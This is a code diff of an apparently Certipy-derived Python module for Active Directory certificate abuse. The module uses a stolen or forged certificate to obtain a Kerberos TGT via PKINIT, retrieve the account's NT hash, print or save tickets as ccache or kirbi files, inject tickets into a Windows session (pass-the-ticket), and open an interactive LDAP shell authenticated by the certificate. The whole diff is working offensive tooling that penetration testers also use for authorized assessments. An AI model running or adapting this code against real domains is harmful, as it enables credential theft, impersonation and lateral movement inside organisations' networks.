@@ -1,11 +1,18 @@
 import argparse
+import base64
 import datetime
-import logging
+import os
+import platform
+import ssl
+import sys
+import tempfile
 from random import getrandbits
-from typing import Callable, Tuple, Union
+from typing import Tuple, Union
 
+import ldap3
 from asn1crypto import cms, core
 from impacket.dcerpc.v5.rpcrt import TypeSerialization1
+from impacket.examples.ldap_shell import LdapShell as _LdapShell
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import (
     AD_IF_RELEVANT,
@@ -33,19 +40,51 @@ from impacket.krb5.types import KerberosTime, Principal, Ticket
 from pyasn1.codec.der import decoder, encoder
 from pyasn1.type.univ import noValue
 
-from certipy.certificate import (
-    get_id_from_certificate,
+from certipy.lib.certificate import (
+    cert_id_to_parts,
+    cert_to_pem,
+    get_identifications_from_certificate,
     get_object_sid_from_certificate,
     hash_digest,
     hashes,
+    key_to_pem,
     load_pfx,
     rsa,
     x509,
 )
-from certipy.pkinit import PA_PK_AS_REP, Enctype, KDCDHKeyInfo, build_pkinit_as_req
-from certipy.target import Target
+from certipy.lib.errors import KRB5_ERROR_MESSAGES
+from certipy.lib.logger import logging
+from certipy.lib.pkinit import PA_PK_AS_REP, Enctype, KDCDHKeyInfo, build_pkinit_as_req
+from certipy.lib.target import Target
 
-NAME = "auth"
+
+class LdapShell(_LdapShell):
+    def __init__(self, tcp_shell, domain_dumper, client):
+        super().__init__(tcp_shell, domain_dumper, client)
+
+        self.use_rawinput = True
+        self.shell = tcp_shell
+
+        self.prompt = "\n# "
+        self.tid = None
+        self.intro = "Type help for list of commands"
+        self.loggedIn = True
+        self.last_output = None
+        self.completion = []
+        self.client = client
+        self.domain_dumper = domain_dumper
+
+    def do_dump(self, line):
+        logging.warning("Not implemented")
+
+    def do_exit(self, line):
+        print("Bye!")
+        return True
+
+
+class DummyDomainDumper:
+    def __init__(self, root: str):
+        self.root = root
 
 
 def truncate_key(value: bytes, keysize: int) -> bytes:
@@ -62,28 +101,6 @@ def truncate_key(value: bytes, keysize: int) -> bytes:
     return output
 
 
-def cert_id_to_parts(id_type: str, identification: str) -> Tuple[str, str]:
-    if id_type == "DNS Host Name":
-        parts = identification.split(".")
-        if len(parts) == 1:
-            cert_username = identification
-            cert_domain = ""
-        else:
-            cert_username = parts[0] + "$"
-            cert_domain = ".".join(parts[1:])
-    elif id_type == "UPN":
-        parts = identification.split("@")
-        if len(parts) == 1:
-            cert_username = identification
-            cert_domain = ""
-        else:
-            cert_username = "@".join(parts[:-1])
-            cert_domain = parts[-1]
-    else:
-        return (None, None)
-    return (cert_username, cert_domain)
-
-
 class Authenticate:
     def __init__(
         self,
@@ -91,8 +108,15 @@ class Authenticate:
         pfx: str = None,
         cert: x509.Certificate = None,
         key: rsa.RSAPublicKey = None,
-        no_ccache: bool = False,
+        no_save: bool = False,
         no_hash: bool = False,
+        ptt: bool = False,
+        print: bool = False,
+        kirbi: bool = False,
+        ldap_shell: bool = False,
+        ldap_port: int = 389,
+        ldap_user_dn: str = None,
+        user_dn: str = None,
         debug=False,
         **kwargs
     ):
@@ -100,8 +124,15 @@ class Authenticate:
         self.pfx = pfx
         self.cert = cert
         self.key = key
-        self.no_ccache = no_ccache
+        self.no_save = no_save
         self.no_hash = no_hash
+        self.ptt = ptt
+        self.print = print
+        self.kirbi = kirbi
+        self.ldap_shell = ldap_shell
+        self.ldap_port = ldap_port
+        self.ldap_user_dn = ldap_user_dn
+        self.user_dn = user_dn
         self.verbose = debug
         self.kwargs = kwargs
 
@@ -113,16 +144,44 @@ class Authenticate:
 
     def authenticate(
         self, username: str = None, domain: str = None, is_key_credential=False
-    ) -> Union[str, bool]:
+    ):
         if username is None:
             username = self.target.username
         if domain is None:
             domain = self.target.domain
 
+        if self.ldap_shell:
+            return self.ldap_authentication()
+
+        id_type = None
+        identification = None
+        object_sid = None
         if not is_key_credential:
-            id_type, identification = get_id_from_certificate(self.cert)
+            identifications = get_identifications_from_certificate(self.cert)
+
+            if len(identifications) > 1:
+                logging.info("Found multiple identifications in certificate")
+
+                while True:
+                    logging.info("Please select one:")
+                    for i, identification in enumerate(identifications):
+                        id_type, id_value = identification
+                        print("    [%d] %s: %s" % (i, id_type, repr(id_value)))
+                    idx = int(input("> "))
+
+                    if idx >= len(identifications):
+                        logging.warning("Invalid index")
+                    else:
+                        id_type, identification = identifications[idx]
+                        break
+            elif len(identifications) == 1:
+                id_type, identification = identifications[0]
+            else:
+                id_type, identification = None, None
+
+            cert_username, cert_domain = cert_id_to_parts([(id_type, identification)])
+
             object_sid = get_object_sid_from_certificate(self.cert)
-            cert_username, cert_domain = cert_id_to_parts(id_type, identification)
 
             if not any([cert_username, cert_domain]):
                 logging.warning(
@@ -146,6 +205,7 @@ class Authenticate:
                     res = input("Do you want to continue? (Y/n) ").rstrip("\n")
                     if res.lower() == "n":
                         return False
+
             if not domain:
                 domain = cert_domain
             elif cert_domain:
@@ -188,6 +248,93 @@ class Authenticate:
 
         logging.info("Using principal: %s" % upn)
 
+        return self.kerberos_authentication(
+            username,
+            domain,
+            is_key_credential,
+            id_type,
+            identification,
+            object_sid,
+            upn,
+        )
+
+    def ldap_authentication(
+        self,
+        domain: str = None,
+    ) -> Union[str, bool]:
+        key_file = tempfile.NamedTemporaryFile(delete=False)
+        key_file.write(key_to_pem(self.key))
+        key_file.close()
+
+        cert_file = tempfile.NamedTemporaryFile(delete=False)
+        cert_file.write(cert_to_pem(self.cert))
+        cert_file.close()
+
+        sasl_credentials = None
+        if self.ldap_user_dn:
+            sasl_credentials = "dn:%s" % self.ldap_user_dn
+
+        tls = ldap3.Tls(
+            local_private_key_file=key_file.name,
+            local_certificate_file=cert_file.name,
+            validate=ssl.CERT_NONE,
+        )
+
+        host = self.target.target_ip
+        if host is None:
+            host = domain
+        host = "ldap://%s:%d" % (host, self.ldap_port)
+
+        logging.info("Connecting to %s" % repr(host))
+        ldap_server = ldap3.Server(
+            host=host,
+            get_info=ldap3.ALL,
+            tls=tls,
+            connect_timeout=5,
+        )
+
+        try:
+            ldap_conn = ldap3.Connection(
+                ldap_server,
+                authentication=ldap3.SASL,
+                sasl_mechanism=ldap3.EXTERNAL,
+                sasl_credentials=sasl_credentials,
+                auto_bind=ldap3.AUTO_BIND_TLS_BEFORE_BIND,
+                raise_exceptions=True,
+            )
+        except ldap3.core.exceptions.LDAPUnavailableResult as e:
+            logging.error("LDAP not configured for SSL/TLS connections")
+            if self.verbose:
+                raise e
+            return False
+
+        who_am_i = ldap_conn.extend.standard.who_am_i()
+        logging.info(
+            "Authenticated to %s as: %s" % (repr(self.target.target_ip), who_am_i)
+        )
+
+        root = ldap_server.info.other["defaultNamingContext"][0]
+        domain_dumper = DummyDomainDumper(root)
+        ldap_shell = LdapShell(sys, domain_dumper, ldap_conn)
+        try:
+            ldap_shell.cmdloop()
+        except KeyboardInterrupt:
+            print("Bye!\n")
+            pass
+
+        os.unlink(key_file.name)
+        os.unlink(cert_file.name)
+
+    def kerberos_authentication(
+        self,
+        username: str = None,
+        domain: str = None,
+        is_key_credential: bool = False,
+        id_type: str = None,
+        identification: str = None,
+        object_sid: str = None,
+        upn: str = None,
+    ) -> Union[str, bool]:
         as_req, diffie = build_pkinit_as_req(username, domain, self.key, self.cert)
 
         logging.info("Trying to get TGT...")
@@ -195,6 +342,10 @@ class Authenticate:
         try:
             tgt = sendReceive(encoder.encode(as_req), domain, self.target.target_ip)
         except KerberosError as e:
+            if e.getErrorCode() not in KRB5_ERROR_MESSAGES:
+                logging.error("Got unknown Kerberos error: %#x" % e.getErrorCode())
+                return False
+
             if "KDC_ERR_CLIENT_NAME_MISMATCH" in str(e) and not is_key_credential:
                 logging.error(
                     ("Name mismatch between certificate and user %s" % repr(username))
@@ -213,7 +364,10 @@ class Authenticate:
                     )
             elif "KDC_ERR_CERTIFICATE_MISMATCH" in str(e) and not is_key_credential:
                 logging.error(
-                    ("Object SID mismatch between certificate and user %s" % repr(username))
+                    (
+                        "Object SID mismatch between certificate and user %s"
+                        % repr(username)
+                    )
                 )
                 if object_sid is not None:
                     logging.error(
@@ -277,12 +431,44 @@ class Authenticate:
         cipher = _enctype_table[int(enc_as_rep_part["key"]["keytype"])]
         session_key = Key(cipher.enctype, bytes(enc_as_rep_part["key"]["keyvalue"]))
 
-        if not self.no_ccache:
-            ccache = CCache()
-            ccache.fromTGT(tgt, key, None)
-            self.ccache_name = "%s.ccache" % username.rstrip("$")
-            ccache.saveFile(self.ccache_name)
-            logging.info("Saved credential cache to %s" % repr(self.ccache_name))
+        ccache = CCache()
+        ccache.fromTGT(tgt, key, None)
+        krb_cred = ccache.toKRBCRED()
+
+        if self.print:
+            logging.info("Ticket:")
+            print(base64.b64encode(krb_cred).decode())
+
+        if not self.no_save or self.ptt:
+            if not self.no_save:
+                if self.kirbi:
+                    kirbi_name = "%s.kirbi" % username.rstrip("$")
+                    ccache.saveKirbiFile(kirbi_name)
+                    logging.info("Saved Kirbi file to %s" % repr(kirbi_name))
+                else:
+                    self.ccache_name = "%s.ccache" % username.rstrip("$")
+                    ccache.saveFile(self.ccache_name)
+                    logging.info(
+                        "Saved credential cache to %s" % repr(self.ccache_name)
+                    )
+
+            if self.ptt:
+                krb_cred = ccache.toKRBCRED()
+                logging.info("Trying to inject ticket into session")
+
+                if platform.system().lower() != "windows":
+                    logging.error("Not running on Windows platform. Aborting")
+                else:
+                    try:
+                        from certipy.lib import sspi
+
+                        res = sspi.submit_ticket(krb_cred)
+                        if res:
+                            logging.info("Successfully injected ticket into session")
+                    except Exception as e:
+                        logging.error(
+                            "Failed to inject ticket into session: %s" % str(e)
+                        )
 
         if not self.no_hash:
             logging.info("Trying to retrieve NT hash for %s" % repr(username))
@@ -443,66 +629,8 @@ def entry(options: argparse.Namespace) -> None:
         ns=options.ns,
         timeout=options.timeout,
         dns_tcp=options.dns_tcp,
+        no_pass=True,
     )
 
     authenticate = Authenticate(target=target, **vars(options))
     authenticate.authenticate()
-
-
-def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
-    subparser = subparsers.add_parser(NAME, help="Authenticate using certificates")
-
-    subparser.add_argument(
-        "-pfx",
-        action="store",
-        metavar="pfx/p12 file name",
-        help="Path to certificate",
-        required=True,
-    )
-
-    subparser.add_argument("-no-ccache", action="store_true", help="Don't save CCache")
-    subparser.add_argument(
-        "-no-hash", action="store_true", help="Don't request NT hash"
-    )
-    subparser.add_argument("-debug", action="store_true", help="Turn debug output on")
-
-    group = subparser.add_argument_group("connection options")
-
-    group.add_argument(
-        "-dc-ip",
-        action="store",
-        metavar="ip address",
-        help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in "
-        "the target parameter",
-    )
-    group.add_argument(
-        "-ns",
-        action="store",
-        metavar="nameserver",
-        help="Nameserver for DNS resolution",
-    )
-    group.add_argument(
-        "-dns-tcp", action="store_true", help="Use TCP instead of UDP for DNS queries"
-    )
-    group.add_argument(
-        "-timeout",
-        action="store",
-        metavar="seconds",
-        help="Timeout for connections",
-        default=5,
-        type=int,
-    )
-
-    group = subparser.add_argument_group("authentication options")
-    group.add_argument(
-        "-username",
-        action="store",
-        metavar="username",
-    )
-    group.add_argument(
-        "-domain",
-        action="store",
-        metavar="domain",
-    )
-
-    return NAME, entry
